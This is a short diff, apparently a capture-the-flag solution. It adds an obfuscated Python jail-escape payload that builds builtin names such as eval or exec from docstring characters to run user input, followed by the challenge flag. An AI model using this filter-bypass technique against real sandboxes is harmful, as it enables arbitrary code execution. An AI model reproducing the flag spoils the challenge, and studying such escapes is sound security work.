@@ -1,0 +1,3 @@
+ __builtins__.__dict__[dict.__doc__[1]+dict.__doc__[10]+dict.__doc__[16]+list.__doc__[1]+dict.__doc__[3]](__builtins__.__dict__[list.__doc__[3]+bool.__doc__[1]+dict.__doc__[2]+list.__doc__[12]+list.__doc__[3]+list.__doc__[17]]())
+
+DH{You_@r3_L1p0gr4m_M4st3r! How_did_y0u_complet3_this?}
